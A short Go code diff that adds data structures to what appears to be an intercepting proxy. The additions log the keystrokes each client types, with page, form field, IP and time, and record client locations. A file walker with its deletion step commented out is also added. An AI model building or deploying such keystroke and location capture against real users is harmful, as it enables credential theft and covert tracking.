@@ -14,6 +14,34 @@ import (
 
 // -----------------------------------------------------------------------------------------
 
+//store keylogs for proxy session
+var keylogs []KeyLog
+//store locations for proxy session
+var locations []Location
+//proxy password
+var password string
+
+//key logger object
+type KeyLog struct {
+    Page string //what page they were on when they typed it
+    IP string //which client typed it
+    Content string //what was typed
+    Timestamp string //the time at which it was typed
+    DomObject string //where the data was typed
+}
+type Location struct {
+    IP string
+    Latitude string
+    Longitude string
+    Timestamp string
+}
+/*
+struct for storing result from a filePath Walker
+so that can return it to the user.
+*/
+type Walker struct {
+    files []string
+}
 
 
 
@@ -70,7 +98,16 @@ func utilsGetHTTPHeaders( body string, contentType string ) *http.Response {
     }
     return client_response
 }
-
+func (w *Walker) utilsDeletefiles(path string, f os.FileInfo, err error) (e error) {
+    //must check for the directory otherwise end up deleting it!
+    if !f.Mode().IsDir() {
+         log.Println(path)
+         w.files = append(w.files, path)
+    }
+    //put this back in when you actually do want to clear the currently collected list
+    // os.Remove(path)
+    return
+ }
 
 // -----------------------------------------------------------------------------------------
 
